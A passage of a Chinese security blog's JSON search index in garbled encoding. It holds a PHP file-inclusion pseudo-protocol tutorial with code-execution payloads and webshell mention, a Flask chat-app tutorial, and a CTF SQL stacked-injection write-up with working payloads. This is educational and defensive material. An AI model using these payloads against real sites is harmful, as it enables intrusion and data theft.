[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]\n2.php:&#x2F;&#x2F;åè®®php:&#x2F;&#x2F; è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputphp:&#x2F;&#x2F;filterç”¨äºè¯»å–æºç ã€‚php:&#x2F;&#x2F;inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚\nphp:&#x2F;&#x2F;filter è¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œå°±çœ‹ä¸åˆ°æºä»£ç å†…å®¹äº†ã€‚åˆ©ç”¨æ¡ä»¶:\n\nallow_url_fopen ï¼šoff&#x2F;on\nallow_url_includeï¼šoff&#x2F;on\n\nä¾‹å¦‚æœ‰ä¸€äº›æ•æ„Ÿä¿¡æ¯ä¼šä¿å­˜åœ¨phpæ–‡ä»¶ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«å»æ‰“å¼€ä¸€ä¸ªphpæ–‡ä»¶ï¼Œphpä»£ç æ˜¯ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„ï¼Œä¾‹å¦‚æ‰“å¼€å½“å‰ç›®å½•ä¸‹çš„2.php:ä»–åªæ˜¾ç¤ºäº†ä¸€æ¡è¯­å¥ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä»¥base64ç¼–ç çš„æ–¹å¼è¯»å–æŒ‡å®šæ–‡ä»¶çš„æºç :\nè¾“å…¥php://filter/convert.base64-encode/resource=æ–‡ä»¶è·¯å¾„å¾—åˆ°2.phpåŠ å¯†åçš„æºç ï¼šå†è¿›è¡Œbase64è§£ç ï¼Œè·å–åˆ°2.phpçš„å®Œæ•´æºç ä¿¡æ¯ï¼šphp:&#x2F;&#x2F;input å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ¡ä»¶:\n\nallow_url_fopen ï¼šoff&#x2F;on\nallow_url_includeï¼šon\n\nåˆ©ç”¨è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥phpæ–‡ä»¶ï¼Œè¾“å…¥file=php://inputï¼Œç„¶åä½¿ç”¨burpæŠ“åŒ…ï¼Œå†™å…¥phpä»£ç ï¼šå‘é€æŠ¥æ–‡ï¼Œå¯ä»¥çœ‹åˆ°æœ¬åœ°ç”Ÿæˆäº†ä¸€å¥è¯æœ¨é©¬ï¼š\n3.ZIP:&#x2F;&#x2F;åè®®zip:&#x2F;&#x2F; å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\nzip:&#x2F;&#x2F;ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚\nè¦ç”¨#åˆ†å‰²å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç æˆ%23(å³ä¸‹è¿°POCä¸­#è¦ç”¨%23æ›¿æ¢ï¼‰\nåªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚\nç›¸åŒçš„ç±»å‹è¿˜æœ‰zlib:&#x2F;&#x2F;å’Œbzip2:&#x2F;&#x2F;\n\nåˆ©ç”¨æ¡ä»¶:\n\nallow_url_fopen ï¼šoff&#x2F;on\nallow_url_includeï¼šoff&#x2F;on\n\nPOCä¸ºï¼š\nzip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]?file=zip://D:\\1.zip%23phpinfo.txt\n\n\n4.data:&#x2F;&#x2F;åè®®data:&#x2F;&#x2F; åŒæ ·ç±»ä¼¼ä¸php:&#x2F;&#x2F;inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\nåˆ©ç”¨data:&#x2F;&#x2F; ä¼ªåè®®å¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œphpinfo()å‡½æ•°ï¼šåˆ©ç”¨æ¡ä»¶:\n\nallow_url_fopen ï¼šon\nallow_url_includeï¼šon\n\nPOCä¸º:\ndata://text/plain,&lt;?php phpinfo();?&gt;//å¦‚æœæ­¤å¤„å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥ï¼šdata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\n\n5.ä¼ªåè®®åˆ©ç”¨æ¡ä»¶ä¼ªåè®®çš„åˆ©ç”¨æ–¹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚ä¼ªåè®®çš„ç”¨æ³•å°ç»“\næ–‡ä»¶åŒ…å«æ¼æ´é˜²æŠ¤1ã€ä½¿ç”¨str_replaceç­‰æ–¹æ³•è¿‡æ»¤æ‰å±é™©å­—ç¬¦\n2ã€é…ç½®open_basedirï¼Œé˜²æ­¢ç›®å½•éå†ï¼ˆopen_basedir å°†phpæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼‰\n3ã€phpç‰ˆæœ¬å‡çº§ï¼Œé˜²æ­¢%00æˆªæ–­\n4ã€å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œé˜²æ­¢è¢«è¯»å–\n5ã€å¯¹äºåŠ¨æ€åŒ…å«çš„æ–‡ä»¶å¯ä»¥è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œä¸è¯»å–éç™½åå•çš„æ–‡ä»¶ã€‚\n6ã€åšå¥½ç®¡ç†å‘˜æƒé™åˆ’åˆ†ï¼Œåšå¥½æ–‡ä»¶çš„æƒé™ç®¡ç†ï¼Œallow_url_includeå’Œallow_url_fopenæœ€å°æƒé™åŒ–\n"},{"title":"åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿ","url":"/%E5%9F%BA%E4%BA%8EFlask-websocket%E5%AE%9E%E7%8E%B0%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/","content":"åŸºäºFlask+websocketå®ç°åœ¨çº¿èŠå¤©ç³»ç»Ÿâ€‹          webå¼€å‘å°±æ˜¯åŸºäºæµè§ˆå™¨è¿›è¡Œäººæœºäº¤äº’ï¼Œå½“è®¿å®¢ç™»å½•åˆ°æŒ‡å®šç½‘å€åï¼Œä¸ä»…å¯ä»¥çœ‹åˆ°æµè§ˆå™¨æ¸²æŸ“çš„ç”»é¢ï¼ŒåŒæ—¶è¿˜å¯ä»¥ä¸åå°è¿›è¡Œä¸€äº›æ“ä½œï¼Œå†é€šè¿‡æµè§ˆå™¨è¿”å›åå°æœåŠ¡å™¨å¤„ç†çš„ç»“æœï¼Œè¿™æ®µæ—¶é—´ä¸€ç›´åœ¨æ‘¸ç´¢åˆ©ç”¨flaskæ¡†æ¶æ¥åšç‚¹æœ‰æ„æ€çš„äº‹\nä»€ä¹ˆæ˜¯Flaskï¼ŸFlaskæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ Python web å¼€å‘æ¡†æ¶ï¼Œå®ƒä¸ºå¼€å‘è€…æä¾›äº†ä¸€ä¸ªç®€å•ã€ç›´è§‚çš„æ–¹å¼æ¥åˆ›å»º web åº”ç”¨ã€‚ç”±äºå…¶â€œå¾®â€ç‰¹æ€§ï¼Œä½ å¯ä»¥ä»ä¸€ä¸ªç®€å•çš„å•æ–‡ä»¶åº”ç”¨å¼€å§‹ï¼Œç„¶åæ ¹æ®éœ€è¦å¢åŠ æ›´å¤šåŠŸèƒ½ã€‚\nWebsockets å’Œ Flask-SocketIOWebsockets æ˜¯ä¸€ä¸ªç½‘ç»œé€šä¿¡åè®®ï¼Œå…è®¸æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´è¿›è¡ŒåŒå‘å®æ—¶é€šä¿¡ã€‚ä¸ä¼ ç»Ÿçš„ HTTP è¯·æ±‚ç›¸æ¯”ï¼ŒWebsockets æä¾›äº†ä¸€ä¸ªæŒä¹…çš„è¿æ¥ï¼Œä½¿å¾—æ•°æ®èƒ½å¤Ÿå®æ—¶ã€é«˜æ•ˆåœ°åœ¨åŒæ–¹ä¹‹é—´æµåŠ¨ã€‚Flask-SocketIO åˆ™æ˜¯ä¸€ä¸ª Flask æ’ä»¶ï¼Œå®ƒä½¿å¾—åœ¨ Flask åº”ç”¨ä¸­é›†æˆ Websockets å˜å¾—éå¸¸ç®€å•ã€‚ä¸ä»…å¦‚æ­¤ï¼Œå®ƒè¿˜æä¾›äº†ä¸€ç³»åˆ—çš„é«˜çº§åŠŸèƒ½ï¼Œå¦‚å¹¿æ’­ã€å‘½åç©ºé—´å’Œæˆ¿é—´æ”¯æŒï¼Œä½¿å¾—åˆ›å»ºå¤æ‚çš„å®æ—¶åº”ç”¨å˜å¾—è½»è€Œæ˜“ä¸¾ã€‚\nå¤§æ¦‚åŠŸèƒ½ç”¨æˆ·ç®¡ç†åŠŸèƒ½ï¼šåŒ…æ‹¬è´¦å·ç™»å½•ã€æ³¨å†Œç­‰åŠŸèƒ½ã€‚\nå¥½å‹ç®¡ç†åŠŸèƒ½ï¼šå…è®¸ç”¨æˆ·æ·»åŠ å’Œåˆ é™¤å¥½å‹ã€‚\nå³æ—¶èŠå¤©åŠŸèƒ½ï¼šç”¨æˆ·å¯ä»¥è¿›è¡Œå®æ—¶çš„èŠå¤©ï¼Œå¹¶ä¸”é€šè¿‡@ç”¨æˆ·å å¯ä»¥è¿›è¡Œç§èŠã€‚\n&#x27;/&#x27;ï¼ˆé¦–é¡µï¼‰ï¼šå¦‚æœç”¨æˆ·æœªç™»å½•ï¼Œåˆ™é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼›å¦åˆ™ï¼Œé‡å®šå‘åˆ°èŠå¤©é¡µé¢ã€‚&#x27;/login&#x27;ï¼šå¤„ç†ç”¨æˆ·ç™»å½•ï¼Œæ£€æŸ¥å‡­æ®æ˜¯å¦ä¸æ•°æ®åº“åŒ¹é…ã€‚&#x27;/chat&#x27;ï¼šå¦‚æœç”¨æˆ·å·²ç™»å½•ï¼Œåˆ™æ¸²æŸ“èŠå¤©é¡µé¢ï¼›å¦åˆ™ï¼Œé‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚&#x27;/logout&#x27;ï¼šé€šè¿‡åˆ é™¤ç”¨æˆ·çš„ä¼šè¯æ¥æ³¨é”€ç”¨æˆ·ã€‚&#x27;/register&#x27;ï¼šå¤„ç†ç”¨æˆ·æ³¨å†Œï¼Œæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å”¯ä¸€ï¼Œå¹¶å°†ç”¨æˆ·æ·»åŠ åˆ°æ•°æ®åº“ä¸­ã€‚å®šä¹‰WebSocketå¤„ç†ç¨‹åºï¼š&#x27;message&#x27;ï¼šå¤„ç†ä¼ å…¥çš„èŠå¤©æ¶ˆæ¯å¹¶å°†å…¶å¹¿æ’­åˆ°é€‚å½“çš„æˆ¿é—´ã€‚&#x27;join&#x27;ï¼šå¤„ç†ç”¨æˆ·åŠ å…¥èŠå¤©æˆ¿é—´å¹¶æ›´æ–°æˆ¿é—´ä¸­åœ¨çº¿ç”¨æˆ·çš„åˆ—è¡¨ã€‚&#x27;leave&#x27;ï¼šå¤„ç†ç”¨æˆ·ç¦»å¼€èŠå¤©æˆ¿é—´å¹¶æ›´æ–°æˆ¿é—´ä¸­åœ¨çº¿ç”¨æˆ·çš„åˆ—è¡¨ã€‚åœ¨if __name__ == &#x27;__main__&#x27;:éƒ¨åˆ†ï¼Œåˆ›å»ºæ•°æ®åº“è¡¨å¹¶è¿è¡Œåº”ç”¨ç¨‹åºï¼Œå…è®¸WebSocketé€šä¿¡ä»¥å®æ—¶å¤„ç†èŠå¤©æ¶ˆæ¯ã€‚\n\nåˆ›å»ºåœ¨çº¿èŠå¤©ç³»ç»Ÿ\nå®‰è£…å¿…è¦çš„åº“ï¼š\n\npip install Flask flask-socketio\n\n\nåˆå§‹åŒ–Flask åº”ç”¨å¹¶é›†æˆSocketIOï¼š\n\nfrom flask import Flask, render_template, request, redirect, url_for, session, flash, jsonifyfrom flask_socketio import SocketIO, join_room, leave_room, emitapp = Flask(__name__)socketio = SocketIO(app)\n\n\nå®šä¹‰ç®€å•çš„è·¯ç”±ä¸€å‘ˆç°èŠå¤©å®¤çš„å‰ç«¯ç•Œé¢:\n\n@app.route(&#x27;/&#x27;)def index():    if &#x27;username&#x27; in session:        return redirect(url_for(&#x27;chat&#x27;))    return render_template(&#x27;login.html&#x27;)\n\n\nä¸ºèŠå¤©å®¤äº‹ä»¶ï¼ˆå¦‚åŠ å…¥ã€å‘é€æ¶ˆæ¯å’Œç¦»å¼€ï¼‰æ·»åŠ  SocketIO äº‹ä»¶å¤„ç†å‡½æ•°ï¼š\n\n@socketio.on(&#x27;join&#x27;)def join(data):    room = data[&#x27;room&#x27;]    join_room(room)    online_users.add(session[&#x27;username&#x27;])    emit(&#x27;update_online_users&#x27;, &#123;&#x27;online_users&#x27;: list(online_users)&#125;, room=room)@socketio.on(&#x27;leave&#x27;)def leave(data):    room = data[&#x27;room&#x27;]    leave_room(room)    online_users.remove(session[&#x27;username&#x27;])    emit(&#x27;update_online_users&#x27;, &#123;&#x27;online_users&#x27;: list(online_users)&#125;, room=room)\n\n\næœ€åå¯åŠ¨flaskåº”ç”¨ï¼š\n\nif __name__ == &#x27;__main__&#x27;:    with app.app_context():        db.create_all()        socketio.run(app, debug=True)        # socketio.run(app, host=&#x27;0.0.0.0&#x27;, port=80)\n\né¡¹ç›®å±•ç¤ºç”±äºç¯‡å¹…æœ‰é™ï¼Œå¦‚éœ€ç³»ç»Ÿå®Œæ•´ä»£ç ï¼Œå¯ç‚¹å‡»ä¸»é¡µæ·»åŠ QQè·å–\n\næ€»ç»“å€ŸåŠ© Flask å’Œ Flask-SocketIOï¼Œä½ å¯ä»¥è½»æ¾åˆ›å»ºä¸€ä¸ªåŠŸèƒ½é½å…¨çš„åœ¨çº¿èŠå¤©å®¤ã€‚è€Œ Websockets ä¿è¯äº†æ•°æ®åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„å®æ—¶äº¤äº’ï¼Œä¸ºç”¨æˆ·æä¾›äº†ä¸€ä¸ªæ— ç¼çš„ä½“éªŒã€‚è¿™åªæ˜¯ä¸€ä¸ªåŸºç¡€æ¡ˆä¾‹ï¼Œé€šè¿‡è¯¥æ¡ˆä¾‹æˆ‘ä»¬å¯ä»¥å°è¯•æ‰©å±•å‡ºå¾ˆå¤šåŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨çº¿å®¢æœç­‰ï¼Œå¹¶ä¸æ•°æ®åº“ç­‰æŠ€æœ¯ç»“åˆèµ·æ¥ï¼Œéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šå®ç°ä¸€ä¸ªè‡ªå·±çš„é€šä¿¡ç³»ç»Ÿã€‚\n","categories":["Python"],"tags":["Python","html","javascript","css","flask","websocket"]},{"title":"éšä¾¿æ³¨ 1","url":"/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/","content":"å¼ºç½‘æ¯2019-éšä¾¿æ³¨1ï¼Œæµ‹è¯•1&#39; or 1=1 #,åˆæ­¥åˆ¤å®šå­˜åœ¨SQLæ³¨å…¥ã€‚\n1&#x27; or 1=1 #\n\nå†æµ‹è¯•å­—æ®µæ•°ï¼Œåˆ°3æ—¶æŠ¥é”™ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º2.\n1&#x27; order by 1 # \n\næ¥ç€å°è¯•unionæ³¨å…¥,å›æ˜¾äº†è¿‡æ»¤çš„å…³é”®å­—ã€‚\n1&#x27; union select 1,2#\n\n\nç„¶åå°±æ˜¯ä»Šå¤©å­¦ä¼šçš„æ–°å§¿åŠ¿â€œå †å æ³¨å…¥â€äº†ã€‚åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡ ; å·æ³¨å…¥å¤šæ¡SQLè¯­å¥ã€‚å…ˆé€šè¿‡show databasesçˆ†å‡ºæ•°æ®åº“ã€‚\n0&#x27;; show databases; #\n\nç„¶åç”¨ show tables å°è¯•çˆ†è¡¨ã€‚\n0&#x27;; show tables; #\n\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸¤ä¸ªè¡¨ï¼Œæˆ‘ä»¬å…ˆå°è¯•çˆ†wordsè¡¨çš„å†…å®¹ã€‚\n1&#x27;; show columns from words; #\n\nè¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚\n0&#x27;; show columns from `1919810931114514 `; #\n\n1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚\n2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚\n3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚\n4ï¼Œå°† flag æ”¹åä¸º data ã€‚\n1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#\n\n\n\n","categories":["CTF","BUUCTF"],"tags":["sqlæ³¨å…¥","buuctf"]}]